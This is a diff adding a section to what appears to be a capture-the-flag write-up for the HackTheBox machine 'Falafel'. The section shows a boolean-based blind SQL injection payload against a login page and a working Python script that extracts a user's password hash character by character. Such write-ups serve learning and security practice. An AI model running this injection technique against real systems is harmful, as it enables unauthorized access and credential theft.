@@ -47,3 +47,45 @@ Where:
 - ```-hh``` hide results with code 7074
 
 <img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/wfuzz.png" alt="nmap scan">
+
+So we have two valid users which are __chris and admin__.
+
+### SQL Injection to Dump Hash From Database
+We can dump the whole database using the powerfull [sqlmap](http://sqlmap.org/), but that's not the idea because the learning will be gone. What we do here is try to analize the HTTP request from the login page and try to find out the correct SQL sintax that will grant us the access. To do this, the usage of [BurpSuite](https://portswigger.net/burp/communitydownload) will be crucial. So let's get to it. 
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/correct-user.png" alt="nmap scan">
+
+In the repeater from Burpsuite we see that once we go with the right username, we obtain in the response ```Wronf identification : admin``` and the size of the response is ```7,397``` bytes. Saying that, let's see how is the response if we go with the wrong user. 
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/wrong-user.png" alt="nmap scan">
+
+Then, we see the response ```Try again...``` and the size of this response is ```7,376``` bytes. Now knowing the size of a correct and wrong response, let's try different SQL sintax to see if we get the correct one. 
+- __Note:__ There were countless tries before attempting this were most of the SQL sintax came from [SecLists](https://github.com/danielmiessler/SecLists). Also keep in mind what kind of SQL database the target is using. 
+
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/falafel/sql-sintax.png" alt="nmap scan">
+
+Knowing that the sintax gave us a positive answer and that the hash for admin starts with ```0e``` we can create a python script that will get the hash for us. Before this, get in mind the SQL sintax used. 
+```
+admin' and password like '0e%'-- -
+```
+
+#### Python Script
+~~~
+import requests
+
+chars = [0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f'] # Just hex characters.
+
+def GetSQL(i,c): # Getting proper SQL sintax using the chars. 
+    return "chris' and substr(password,%s,1) = '%s'-- -" % (i,c)
+
+for i in range(1,33): # Try to discover the hash
+    for c in chars:
+        injection = GetSQL(i,c)
+        payload = {'username':injection, 'password':'password'}
+        r = requests.post('http://10.10.10.73/login.php', data = payload)
+        if "Wrong identification" in r.text:
+            print(c, end='',flush=True)
+            break
+print()
+
+~~~
